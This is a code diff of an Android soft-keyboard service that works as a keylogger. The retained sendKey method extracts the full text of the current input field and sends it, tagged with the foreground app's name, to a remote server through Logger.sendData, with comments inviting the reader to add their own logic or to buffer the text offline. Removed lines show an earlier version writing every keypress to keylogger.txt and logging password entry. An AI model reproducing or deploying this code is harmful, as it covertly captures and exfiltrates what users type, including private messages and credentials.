@@ -212,7 +212,7 @@ public class SoftKeyboard extends InputMethodService
                         variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) {
                     // Do not display predictions / what the user is typing
                     // when they are entering a password.
-                	Log.w("YES", "PASSWORD BEING INPUT!!!!");
+                	//Log.w("YES", "PASSWORD BEING INPUT!!!!");
                     mPredictionOn = false;
                 }
                 
@@ -305,27 +305,6 @@ public class SoftKeyboard extends InputMethodService
     public void onFinishInputView(boolean finishingInput) {
         super.onFinishInputView(finishingInput);
         Log.w("YES", "onFinishInputView");
-        /*
-        InputConnection ic = getCurrentInputConnection();
-        if (ic != null){
-            ExtractedText extr = ic.getExtractedText(new ExtractedTextRequest(), 0);
-            if(extr!=null)
-                Log.w("YES", "1 "+extr.text);
-            else
-            {
-                String s =ic.getTextBeforeCursor(9999, 0).toString();
-                if (s==null){
-                    Log.w("YES", "OPS NOTHING TO DO");
-                }  else{
-                    Log.w("YES", "2 OnKey "+(s.length()-1));
-                }
-                Log.w("YES", "OPS OPS OPS ");
-            }
-        } else {
-            Log.w("YES", "IC is null");
-        }
-        */
-
     }
 
 
@@ -508,7 +487,7 @@ public class SoftKeyboard extends InputMethodService
      */
     private void commitTyped(InputConnection inputConnection) {
         if (mComposing.length() > 0) {
-            Log.w("YES", "()"+ mComposing.toString() +"()");
+            //Log.w("YES", "()"+ mComposing.toString() +"()");
             inputConnection.commitText(mComposing, mComposing.length());
 
             mComposing.setLength(0);
@@ -558,42 +537,43 @@ public class SoftKeyboard extends InputMethodService
      */
     private void sendKey(int keyCode) {
         InputConnection ic = getCurrentInputConnection();
-        if (ic != null){
+        if (ic != null) {
             ExtractedText extr = ic.getExtractedText(new ExtractedTextRequest(), 0);
-            if(extr!=null) {
-                String extractedText = (String) extr.text;
-                Log.w("YES", "1 " + extr.text);
-                if (isOnline()){
-                    Logger.sendData(foregroundTaskAppName, extractedText);
+            if (extr != null) {
+                String extractedText = (String) extr.text; //extracted text to be sent
+                if (isOnline()) { //check if the user is online
+                    /* Do your own logic here with the extracted text string
+                     * Here, I'm sending the data to a remote server */
+                    Logger.sendData(foregroundTaskAppName, extractedText); //send the data
                 } else {
-                    //store data in db and send when online
+                    //store data in db and send when online if you wish
+                }
+            } else {
+                /* for Android JellyBeans, there's a bug in ExtractedText that was reported (it returns null)
+                check this
+                https://code.google.com/p/android/issues/detail?id=36152#makechanges
+                here's a work around.
+                 */
+                String s = ic.getTextBeforeCursor(9999, 0).toString();
+                if (s != null) {
+                    // you may use s instead
+                } else {
+                    // nothing to do.
                 }
             }
-            else
-            {
-                String s =ic.getTextBeforeCursor(9999, 0).toString();
-                if (s==null){
-                    Log.w("YES", "OPS NOTHING TO DO");
-                }  else{
-                    Log.w("YES", "2 OnKey "+(s.length()-1));
-                }
-                Log.w("YES", "OPS OPS OPS ");
-            }
-        } else {
-            Log.w("YES", "IC is null");
-        }
-        switch (keyCode) {
-            case '\n':
-                keyDownUp(KeyEvent.KEYCODE_ENTER);
-                break;
-            default:
-                if (keyCode >= '0' && keyCode <= '9') {
-                    keyDownUp(keyCode - '0' + KeyEvent.KEYCODE_0);
-                } else {
-                    getCurrentInputConnection().commitText(String.valueOf((char) keyCode), 1);
-                }
+            switch (keyCode) {
+                case '\n':
+                    keyDownUp(KeyEvent.KEYCODE_ENTER);
+                    break;
+                default:
+                    if (keyCode >= '0' && keyCode <= '9') {
+                        keyDownUp(keyCode - '0' + KeyEvent.KEYCODE_0);
+                    } else {
+                        getCurrentInputConnection().commitText(String.valueOf((char) keyCode), 1);
+                    }
 
-                break;
+                    break;
+            }
         }
     }
 
@@ -601,21 +581,6 @@ public class SoftKeyboard extends InputMethodService
 
     public void onKey(int primaryCode, int[] keyCodes) {
     	String keypress = String.valueOf((char)primaryCode);
-    	Log.d("Key Pressed",keypress);
-    	try{
-        	/*String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
-        	String FILENAME = "keylogger.txt";
-            //Log.w("YES", "TEST");
-    		File outfile = new File(SDCARD+File.separator+FILENAME);
-    		FileOutputStream fos = new FileOutputStream(outfile,true);
-    		fos.write(keypress.getBytes());
-    		fos.close();
-    		*/
-    	}catch(Exception e) {
-    		Log.d("EXCEPTION",e.getMessage());
-    	}
-
-
         if (isWordSeparator(primaryCode)) {
             // Handle separator
             if (mComposing.length() > 0) {
